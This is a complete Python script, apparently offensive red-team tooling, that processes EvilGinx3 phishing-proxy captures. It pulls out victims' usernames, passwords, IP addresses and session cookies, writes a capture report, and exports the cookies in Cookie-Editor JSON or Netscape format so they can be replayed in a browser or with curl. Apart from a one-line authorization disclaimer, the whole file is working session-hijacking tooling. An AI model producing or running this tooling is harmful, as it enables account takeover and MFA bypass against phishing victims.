#!/usr/bin/env python3
"""
EvilGinx3 Session Analysis and Cookie Export Script

Parses EvilGinx3 session data and prepares cookies for browser import.
For authorized red team engagements only.
"""

import json
import sys
import os
import re
from datetime import datetime
from pathlib import Path


def parse_evilginx_session(session_data: str) -> dict:
    """Parse raw EvilGinx3 session output into structured data."""
    session = {
        "id": "",
        "phishlet": "",
        "username": "",
        "password": "",
        "landing_url": "",
        "useragent": "",
        "remote_addr": "",
        "create_time": "",
        "update_time": "",
        "tokens": [],
        "custom": {}
    }

    lines = session_data.strip().split("\n")
    for line in lines:
        line = line.strip()
        if line.startswith("id:"):
            session["id"] = line.split(":", 1)[1].strip()
        elif line.startswith("phishlet:"):
            session["phishlet"] = line.split(":", 1)[1].strip()
        elif line.startswith("username:"):
            session["username"] = line.split(":", 1)[1].strip()
        elif line.startswith("password:"):
            session["password"] = line.split(":", 1)[1].strip()
        elif line.startswith("landing_url:"):
            session["landing_url"] = line.split(":", 1)[1].strip()
        elif line.startswith("useragent:"):
            session["useragent"] = line.split(":", 1)[1].strip()
        elif line.startswith("remote_addr:"):
            session["remote_addr"] = line.split(":", 1)[1].strip()
        elif line.startswith("create_time:"):
            session["create_time"] = line.split(":", 1)[1].strip()
        elif line.startswith("update_time:"):
            session["update_time"] = line.split(":", 1)[1].strip()

    return session


def extract_cookies_from_tokens(token_data: str) -> list:
    """Extract cookies from EvilGinx3 token capture data."""
    cookies = []
    cookie_pattern = re.compile(
        r'name:\s*"?([^"\n]+)"?\s*.*?'
        r'value:\s*"?([^"\n]+)"?\s*.*?'
        r'domain:\s*"?([^"\n]+)"?\s*.*?'
        r'path:\s*"?([^"\n]+)"?',
        re.DOTALL
    )

    for match in cookie_pattern.finditer(token_data):
        cookie = {
            "name": match.group(1).strip(),
            "value": match.group(2).strip(),
            "domain": match.group(3).strip(),
            "path": match.group(4).strip(),
            "secure": True,
            "httpOnly": True,
            "sameSite": "None"
        }
        cookies.append(cookie)

    return cookies


def export_cookies_for_browser(cookies: list, output_format: str = "json") -> str:
    """Export cookies in a format importable by browser extensions."""
    if output_format == "json":
        # Cookie-Editor compatible JSON format
        browser_cookies = []
        for cookie in cookies:
            browser_cookies.append({
                "name": cookie["name"],
                "value": cookie["value"],
                "domain": cookie["domain"],
                "path": cookie.get("path", "/"),
                "secure": cookie.get("secure", True),
                "httpOnly": cookie.get("httpOnly", True),
                "sameSite": cookie.get("sameSite", "None"),
                "expirationDate": None
            })
        return json.dumps(browser_cookies, indent=2)

    elif output_format == "netscape":
        # Netscape cookie format for curl/wget
        lines = ["# Netscape HTTP Cookie File"]
        for cookie in cookies:
            lines.append(
                f"{cookie['domain']}\tTRUE\t{cookie.get('path', '/')}\t"
                f"{'TRUE' if cookie.get('secure') else 'FALSE'}\t0\t"
                f"{cookie['name']}\t{cookie['value']}"
            )
        return "\n".join(lines)

    return ""


def generate_session_report(session: dict, cookies: list) -> str:
    """Generate a report of the captured session."""
    report = [
        "=" * 60,
        "EvilGinx3 Session Capture Report",
        f"Generated: {datetime.now().isoformat()}",
        "=" * 60,
        "",
        f"Session ID: {session.get('id', 'N/A')}",
        f"Phishlet: {session.get('phishlet', 'N/A')}",
        f"Target Username: {session.get('username', 'N/A')}",
        f"Capture Time: {session.get('create_time', 'N/A')}",
        f"Source IP: {session.get('remote_addr', 'N/A')}",
        f"User Agent: {session.get('useragent', 'N/A')}",
        "",
        f"Cookies Captured: {len(cookies)}",
        "",
        "Cookie Summary:",
    ]

    for i, cookie in enumerate(cookies):
        report.append(f"  [{i+1}] {cookie['name']} @ {cookie['domain']}")

    report.append("")
    report.append("=" * 60)
    return "\n".join(report)


def main():
    """Main entry point for session analysis."""
    if len(sys.argv) < 2:
        print("Usage: python process.py <session_file> [output_format]")
        print("  output_format: json (default) or netscape")
        print("")
        print("Example: python process.py session_capture.txt json")
        return

    session_file = sys.argv[1]
    output_format = sys.argv[2] if len(sys.argv) > 2 else "json"

    if not os.path.exists(session_file):
        print(f"Session file not found: {session_file}")
        return

    with open(session_file, "r") as f:
        session_data = f.read()

    session = parse_evilginx_session(session_data)
    cookies = extract_cookies_from_tokens(session_data)

    report = generate_session_report(session, cookies)
    print(report)

    if cookies:
        cookie_export = export_cookies_for_browser(cookies, output_format)
        output_file = f"cookies_export_{session.get('id', 'unknown')}.{output_format}"
        with open(output_file, "w") as f:
            f.write(cookie_export)
        print(f"Cookies exported to: {output_file}")
    else:
        print("No cookies found in session data.")


if __name__ == "__main__":
    main()
